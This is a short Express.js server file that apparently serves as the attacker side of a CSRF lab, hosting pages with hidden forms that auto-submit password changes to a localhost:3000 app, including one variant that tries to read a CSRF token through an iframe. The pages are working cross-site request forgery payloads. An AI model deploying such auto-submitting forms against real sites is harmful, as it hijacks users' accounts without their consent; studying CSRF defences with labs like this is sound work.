import expressServer from "express";
const app = expressServer();

app.get("/3-post-password-change", (_req, res) => {
  res.send(`
  <form id="form" action="http://localhost:3000/3-post-password-change/" method="post" style="display: none;">
  <input name="newPassword" type=text value="aaaaaaa"></input>
  <button type="submit">submit</buttion>
  </form>
  <script>
      const form = document.getElementById("form")
      form.submit()
  </script>
`);
});

app.get("/4-post-password-change", (_req, res) => {
  res.send(`
  <form id="form" action="http://localhost:3000/4-post-password-change/" method="post" style="display: none;">
  <input name="newPassword" type="text" value="aaaaaaa"></input>
  <input name="csrfToken" type="hidden" value="aaaaaaa"></input>
  <button type="submit">submit</buttion>
  </form>
  <script>
      const form = document.getElementById("form")
      form.submit()
  </script>
`);
});

app.get("/4-post-password-change-with-iframe", (_req, res) => {
  res.send(`
    <iframe id="inlineFrame"
        width="400"
        height="300"
        src="http://localhost:3000/4-post-password-change">
    </iframe>
    <form id="form" action="http://localhost:3000/4-post-password-change/" method="post" style="display: none;">
    <input name="newPassword" type="text" value="aaaaaaa"></input>
    <input name="csrfToken" type="hidden" value="aaaaaaa"></input>
    <button type="submit">submit</buttion>
    </form>
    <script>
        const iframe = document.getElementById("inlineFrame")
        console.log("try to load iframe content via js")
        iframe.contentWindow.onload = () => {
            console.log(iframe.contentWindow.document)
            const csrfToken = iframe.contentWindow.document.getElementsByName("csrfToken")[0]
            console.log(csrfToken)
        }
    </script>
  `);
});

console.log("app listening on port: 4000");
app.listen(4000);
